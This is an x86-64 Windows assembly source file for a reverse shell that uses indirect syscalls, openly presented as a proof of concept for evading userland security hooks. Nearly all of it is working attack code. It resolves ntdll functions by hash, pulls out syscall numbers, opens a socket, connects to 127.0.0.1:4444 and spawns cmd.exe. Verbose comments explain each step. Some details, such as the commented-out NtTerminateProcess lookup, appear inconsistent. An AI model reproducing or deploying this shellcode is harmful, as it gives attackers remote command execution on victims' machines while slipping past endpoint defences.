BITS 64

; Reverse Shell with Indirect Syscalls.
;
; This proof-of-concept is designed to execute
; standalone with userland hook evasion. Also,
; I designed this shellcode to be as verbose as
; possible. People with no prior experience in
; assembly should be able to follow.
;
;                .,u%:;-..
;             ,d$$$$7^^?$i;.
;           ,' /^$S'    `?$i:.
;          j ,'  I$,     jb.:i:
;        ,$S$$b,j$S$$bupd$'.:i;.
;        ,;//"?a$$SI$?S$$b,:iIi:.
;          '   '/?$*'   -*?L':i::
;                ^,'.  j?'b,\ .::
;        .,           .7i_,   .:.
;        ip,i/:|,     d?i7'   . 
;       j7j$$Sp,u,+,.p$?'  ,:'
;       $d$$$SSIiS$$7j7?i:
;          '^"="^'^'^"

        CALL    INIT_SHELLCODE

        SUB     RSP,    0x70
        MOV     RBP,    RSP

        CALL    INIT_NTDLL_API

; Windows ABI follows a standard calling convention.
;
; RCX                           => 1st parameter
; RDX                           => 2nd parameter
; R8                            => 3rd parameter
; R9                            => 4th parameter
; [RSP + 0x20]                  => 5th parameter
; [RSP + 0x28]                  => 6th parameter
; ...
; [RSP + 0x00 .. 0x018] Belong to the functions
; being called. This stack space is used to save
; any arguments that as may need be.

SYSCALLS:

; Creating a socket requires requesting a file
; handle from the networking driver. NtCreateFile
; requires 11 parameters.
;
; RCX                           => Pointer to handle.
; RDX                           => Desired access.
; R8                            => Object attributes.
; R9                            => IO Status.
; [RSP + 0x20]                  => Allocation size.
; [RSP + 0x28]                  => File attributes.
; [RSP + 0x30]                  => Share access.
; [RSP + 0x38]                  => Create disposition.
; [RSP + 0x40]                  => Create options.
; [RSP + 0x48]                  => EA buffer.
; [RSP + 0x50]                  => EA length.
;
; The only 2 that I know may be zero are
; allocation size and file attributes.

RUN_NTCREATEFILE:
        MOV     ECX,    DWORD   [RBP + 0x38]
        MOV     RDX,    QWORD   [RBP + 0x30]
        CALL    SET_SYSCALL

        PUSH    0
        MOV     RCX,    RSP
        MOV     RDX,    0xC0100000
        MOV     RAX,    0x0074006e0069006f
        PUSH    RAX
        MOV     RAX,    0x00700064006e0045
        PUSH    RAX
        MOV     RAX,    0x005c006400660041
        PUSH    RAX
        MOV     RAX,    0x005c006500630069
        PUSH    RAX
        MOV     RAX,    0x007600650044005c
        PUSH    RAX
        PUSH    RSP
        PUSH    0x002A0028
        MOV     RAX,    RSP
        PUSH    0
        PUSH    0
        PUSH    0x42
        PUSH    RAX
        PUSH    0
        PUSH    0x30
        MOV     R8,     RSP
        PUSH    0
        PUSH    0
        MOV     R9,     RSP
        MOV     RAX,    0x00000000FFFFFFFF
        PUSH    RAX
        MOV     RAX,    0xFFFFFFFFFFFFFFFF
        PUSH    RAX
        PUSH    RSP
        PUSH    6
        MOV     RAX,    0x0000000100000002
        PUSH    RAX
        PUSH    0
        MOV     RAX,    0x00585874656B6361
        PUSH    RAX
        MOV     RAX,    0x506E65704F646641
        PUSH    RAX
        MOV     RAX,    0x001E0F0000000000
        PUSH    RAX
        PUSH    0x38
        LEA     RAX,    [RSP + 0x08]
        PUSH    RAX
        PUSH    0x20
        PUSH    3
        PUSH    3
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        CALL    RUN_SYSCALL

        ADD     RSP,    0x118
        CMP     RAX,    0
        JNZ     RUN_NTTERMINATEPROCESS

; NtDeviceIoControlFile requires 10 parameters.
; A bind must come before a connection.
;
; RCX                           => Pointer to handle.
; RDX                           => Event handle.
; R8                            => Pointer to APC routine.
; R9                            => Pointer to APC context.
; [RSP + 0x20]                  => IO Status.
; [RSP + 0x28]                  => Control Code (Bind).
; [RSP + 0x30]                  => Pointer to input buffer.
; [RSP + 0x38]                  => Input length.
; [RSP + 0x40]                  => Pointer to output buffer.
; [RSP + 0x48]                  => Output length.
;
; Event handle, APC routine, APC context may all be
; zero.

RUN_NTBIND:
        MOV     ECX,    [RBP + 0x18]
        MOV     RDX,    [RBP + 0x10]
        CALL    SET_SYSCALL

        MOV     RCX,    QWORD   [RSP]
        XOR     RDX,    RDX
        XOR     R8,     R8
        XOR     R9,     R9
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        MOV     RAX,    0x200000002
        PUSH    RAX
        PUSH    0
        PUSH    0
        PUSH    0x10
        LEA     RAX,    QWORD   [RSP + 0x30]
        PUSH    RAX
        PUSH    0x14
        LEA     RAX,    QWORD   [RSP + 0x28]
        PUSH    RAX
        PUSH    0x12003
        LEA     RAX,    QWORD   [RSP + 0x28]
        PUSH    RAX
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        CALL    RUN_SYSCALL

        ADD     RSP,    0x88
        CMP     RAX,    0
        JNZ     RUN_NTTERMINATEPROCESS

; Connecting.
;
; RCX                           => Pointer to handle.
; RDX                           => Event handle.
; R8                            => Pointer to APC routine.
; R9                            => Pointer to APC context.
; [RSP + 0x20]                  => IO Status.
; [RSP + 0x28]                  => Control Code (Connect).
; [RSP + 0x30]                  => Pointer to input buffer.
; [RSP + 0x38]                  => Input length.
; [RSP + 0x40]                  => Pointer to output buffer.
; [RSP + 0x48]                  => Output length.
;
; Event handle, APC routine, APC context, output
; buffer/length may all be zero.

RUN_NTCONNECT:
        MOV     ECX,    DWORD   [RBP + 0x18]
        MOV     RDX,    QWORD   [RBP + 0x10]
        CALL    SET_SYSCALL

        MOV     RCX,    QWORD   [RSP]
        XOR     RDX,    RDX
        XOR     R8,     R8
        XOR     R9,     R9
        PUSH    0
        PUSH    0
        PUSH    0
        MOV     RAX,    0x0100007F5C110002
        PUSH    RAX
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0x10
        LEA     RAX,    QWORD   [RSP + 0x40]
        PUSH    RAX
        PUSH    0x28
        LEA     RAX,    QWORD   [RSP + 0x28]
        PUSH    RAX,
        PUSH    0x12007
        LEA     RAX,    QWORD   [RSP + 0x28]
        PUSH    RAX
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        CALL    RUN_SYSCALL

        ADD     RSP,    0x98
        CMP     RAX,    0
        JNZ     RUN_NTTERMINATEPROCESS

; NtCreateUserProcess requires 11 parameters. This
; is the most bare-bones that I have gotten to work.
;
; RCX                           => Pointer to process handle.
; RDX                           => Pointer to thread handle.
; R8                            => Process access.
; R9                            => Thread access.
; [RSP + 0x20]                  => Process attributes.
; [RSP + 0x28]                  => Thread attriutes.
; [RSP + 0x30]                  => Process flags.
; [RSP + 0x38]                  => Thread flags.
; [RSP + 0x40]                  => Process parameters..
; [RSP + 0x48]                  => Creation info.
; [RSP + 0x50]                  => Attribute list.
;
; Event handle, APC routine, APC context, output
; buffer/length may all be zero.

RUN_RTLCREATEUSERPROCESSPARAMS:
        MOV     ECX,    DWORD   [RBP + 0x08]
        MOV     RDX,    QWORD   [RBP + 0]
        CALL    SET_SYSCALL

        PUSH    0
        PUSH    0
        PUSH    0
        MOV     RCX,    RSP        
        MOV     RAX,    0x0000006500780065
        PUSH    RAX
        MOV     RAX,    0x002E0064006D0063
        PUSH    RAX
        MOV     RAX,    0x005C00320033006D
        PUSH    RAX
        MOV     RAX,    0x0065007400730079
        PUSH    RAX
        MOV     RAX,    0x0053005C00730077
        PUSH    RAX
        MOV     RAX,    0x006F0064006E0069
        PUSH    RAX
        MOV     RAX,    0x0057005C003A0043
        PUSH    RAX
        MOV     RAX,    0x005C003F003F005C
        PUSH    RAX
        PUSH    RSP
        PUSH    0x0040003E
        MOV     RDX,    RSP
        PUSH    0
        PUSH    0x01
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        CALL    RUN_SYSCALL

        ADD     RSP,    0xC0

RUN_NTCREATEUSERPROCESS:
        MOV     ECX,    DWORD   [RBP + 0x28]
        MOV     RDX,    QWORD   [RBP + 0x20]
        CALL    SET_SYSCALL

        SUB     RSP,    0x10
        MOV     RAX,    QWORD   [RSP]
        MOV     RCX,    0xFFFFFFFFFFFFFFFD
        MOV     QWORD   [RAX + 0x10],   RCX
        MOV     RCX,    QWORD   [RSP + 0x18]
        MOV     QWORD   [RAX + 0x20],   RCX
        MOV     QWORD   [RAX + 0x28],   RCX
        MOV     QWORD   [RAX + 0x30],   RCX
        MOV     ECX,    0x00000100
        MOV     QWORD   [RAX + 0xA4],   RCX
        SUB     RSP,    0x48
        MOV     RAX,    [RSP]
        PUSH    0
        MOV     RCX,    RSP
        PUSH    0
        MOV     RDX,    RSP
        PUSH    0
        PUSH    RAX
        PUSH    0x3E
        PUSH    0x20005
        PUSH    0x28
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0x58
        LEA     RAX,    QWORD   [RSP + 0x50]
        PUSH    RAX
        LEA     RAX,    QWORD   [RSP + 0x08]
        PUSH    RAX
        MOV     RAX,    QWORD   [RSP + 0xE0]
        PUSH    RAX
        PUSH    0
        PUSH    4
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        PUSH    0
        MOV     R8,     0x1F0FFF
        MOV     R9,     0x1F03FF
        CALL    RUN_SYSCALL

        ADD     RSP,    0x130

RUN_NTTERMINATEPROCESS:
        MOV     ECX,    DWORD   [RBP + 0x48]
        MOV     RDX,    QWORD   [RBP + 0x40]
        CALL    SET_SYSCALL

        MOV     RCX,    0xFFFFFFFFFFFFFFFF
        XOR     RDX,    RDX
        CALL    RUN_SYSCALL

; 7:     ...::^^:!.!!GY57~^:.        -!!7!!!--      .:^^--!!!!!--^^:..
; 5J?J^^^^^:..^!YY277GYP! .!?-       . .-7-,-:^^-----^:::::::::^^--!!!!!!---^::..
; &&5P?....:?55&’      YJ..YY5?     .J7:.Y?J?^  .       `^^^:^---^~~~~~~~~~!7777??!!!!!!---^::..
; B&BBG!^::^&-          ?5?&BY7! .:^::^?75&Y7YJ                           .....::::^^-----!777?!!!--^::..
; B&##Y.   :&!          :..~PYY7?B7:~~~^:Y7^.-^                                              ....:::::^^------!7?!!--^:....
; PGGG5-.^-7BR          `!. :Y?^7G?:!:7?5`                                                                 ....::::!777!-----^::::......
; JJJ7Y5~~7~75            ^^ .~  ^G?^^7!       5   .                                                                             .......:::::::...... hi
; 7J???^``   :                     5?J!Y       ~~^.   ^7J..
; :Y7!                               :/#         :^^    .~??~.
; :Y?          .      .               PP                   .!?7^.
; ^?           ^P   .YP~              !&^                ^~.    ‘
; ?!              !!7: ^57:.       .:  ?#^
; J-           5.?5^!  ^ ``!!.::.Y?!:   7B!
; ?            #G&!?        `^^^^^^-^.   ^G?
; ^.          .#B7`              ....?!.   JY:
; ~          .5!:’                   ~^7.   !P!
; ^.         G7 P                      7??:  :Y?
; .:         5:Y                        ^7.::  7J:

INIT_SHELLCODE:
        CLD
        MOV     RAX,    0x7369746E656C6973
        MOV     RAX,    QWORD   [RSP]
        AND     SPL,    0xF0
        PUSH    RAX
        RET

GET_NTDLL:
        MOV     RAX,    GS:[0x60]
        MOV     RAX,    [RAX + 0x18]
        MOV     RAX,    [RAX + 0x30]
        MOV     RAX,    [RAX + 0x10]
        RET

INIT_NTDLL_API:
        CALL    GET_NTDLL
        MOV     QWORD   [RBP + 0x70],   RAX

; GET_NTTERMINATEPROCESS:
;         MOV     RCX,    QWORD   [RBP + 0x70]
;         MOV     RDX,    0x618D8E8F
;         LEA     R8,     QWORD   [RBP + 0x48]
;         LEA     R9,     QWORD   [RBP + 0x40]
;         CALL    FIND_SYSCALL

GET_NTTERMINATETHREAD:
        MOV     RCX,    QWORD   [RBP + 0x60]
        MOV     RDX,    0x3ECF2582
        LEA     R8,     QWORD   [RBP + 0x48]
        LEA     R9,     QWORD   [RBP + 0x40]
        CALL    FIND_SYSCALL

GET_NTCREATEFILE:
        MOV     RCX,    QWORD   [RBP + 0x70]
        MOV     RDX,    0x4489294C
        LEA     R8,     QWORD   [RBP + 0x38]
        LEA     R9,     QWORD   [RBP + 0x30]
        CALL    FIND_SYSCALL

GET_NTCREATEUSERPROCESS:
        MOV     RCX,    QWORD   [RBP + 0x70]
        MOV     RDX,    0xC43BACB
        LEA     R8,     QWORD   [RBP + 0x28]
        LEA     R9,     QWORD   [RBP + 0x20]
        CALL    FIND_SYSCALL

GET_NTDEVICEIOCONTROLFILE:
        MOV     RCX,    QWORD   [RBP + 0x70]
        MOV     RDX,    0x7FB40DDF
        LEA     R8,     QWORD   [RBP + 0x18]
        LEA     R9,     QWORD   [RBP + 0x10]
        CALL    FIND_SYSCALL

GET_RTLCREATEUSERPROCESSPARAMS:
        MOV     RCX,    QWORD   [RBP + 0x70]
        MOV     RDX,    0x90E3A882
        LEA     R8,     QWORD   [RBP + 0x08]
        LEA     R9,     QWORD   [RBP + 0x00]
        CALL    FIND_SYSCALL

        RET

FIND_SYSCALL:

PARSE_MODULE:
        PUSH    R8
        PUSH    R9
        MOV     R8D,    DWORD   [RCX + 0x3C]
        LEA     R8,     QWORD   [RCX + R8]
        MOV     R8D,    DWORD   [R8 + 0x88]
        LEA     R8,     QWORD   [RCX + R8]
        PUSH    R8
        MOV     R9D,    DWORD   [R8 + 0x18]
        MOV     R10D,   DWORD   [R8 + 0x20]
        LEA     R10,    QWORD   [RCX + R10]

SEARCH:
        DEC     R9,
        MOV     ESI,    DWORD   [R10 + R9 * 0x04]
        LEA     RSI,    QWORD   [RCX + RSI]
        XOR     RAX,    RAX
        XOR     R8,     R8

HASH:
        LODSB
        TEST    AL,     AL
        JZ      COMPARE
        ROR     R8D,    0x07
        ADD     R8D,    EAX
        JMP     HASH

COMPARE:
        CMP     RDX,    R8
        JNZ     SEARCH
        
FIND_STUB:
        POP     R8
        MOV     EAX,    DWORD   [R8 + 0x24]
        LEA     RAX,    QWORD   [RCX + RAX]
        MOVZX   EDX,    WORD    [RAX + R9 * 0x02]
        MOV     EAX,    DWORD   [R8 + 0x1C]
        LEA     RAX,    QWORD   [RCX + RAX]
        MOV     EAX,    DWORD   [RAX + RDX * 0x04]
        LEA     RDX,    QWORD   [RCX + RAX]

FIND_SYSTEM_SERVICE_NUMBER:
        XOR     R8,     R8

NUM_FOR:
        CMP     R8B,    0xFF
        JNZ     SEARCH_NUM
        XOR     RAX,    RAX
        JMP     FIND_SYSCALL_INSTRUCTION

SEARCH_NUM:
        MOV     EAX,    DWORD   [RDX + R8]
        AND     EAX,    0xFF0000FF
        CMP     EAX,    0x000000B8
        JZ      SAVE_NUM
        INC     R8
        JMP     NUM_FOR

SAVE_NUM:
        MOV     EAX,    DWORD   [RDX + R8 + 1]

FIND_SYSCALL_INSTRUCTION:
        XOR     R8,     R8

INSTRUCT_FOR:
        CMP     R8B,    0xFF
        JNZ     SEARCH_INSTRUCT
        MOV     RCX,    RDX
        JMP     ABANDON

SEARCH_INSTRUCT:
        MOV     CX,     WORD    [RDX + R8]
        CMP     CX,     0x050F
        JZ      SAVE_INSTRUCT
        INC     R8
        JMP     INSTRUCT_FOR

SAVE_INSTRUCT:
        LEA     RCX,    QWORD   [RDX + R8]

ABANDON:
        POP     R9
        POP     R8
        MOV     DWORD   [R8],   EAX
        MOV     QWORD   [R9],   RCX
        RET

SET_SYSCALL:
        XOR     RAX,    RAX
        MOV     DWORD   [RBP + 0x58],   EAX
        MOV     QWORD   [RBP + 0x50],   RAX
        MOV     DWORD   [RBP + 0x58],   ECX
        MOV     QWORD   [RBP + 0x50],   RDX
        RET

RUN_SYSCALL:
        MOV     EAX,    DWORD   [RBP + 0x58]
        MOV     R10,    RCX
        JMP     QWORD   [RBP + 0x50]